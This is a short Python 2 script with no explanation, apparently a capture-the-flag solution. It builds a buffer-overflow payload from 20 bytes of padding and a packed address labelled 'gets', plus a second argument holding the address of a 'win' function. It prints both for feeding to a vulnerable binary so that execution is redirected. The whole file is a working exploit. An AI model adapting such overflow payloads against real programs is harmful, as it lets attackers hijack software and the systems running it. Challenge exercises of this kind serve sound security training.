import struct
gets=struct.pack('<I',0x08049774)
win=struct.pack('<I',0x08048494)
exp1='A'*20+gets
exp2=win
print exp1+" "+exp2
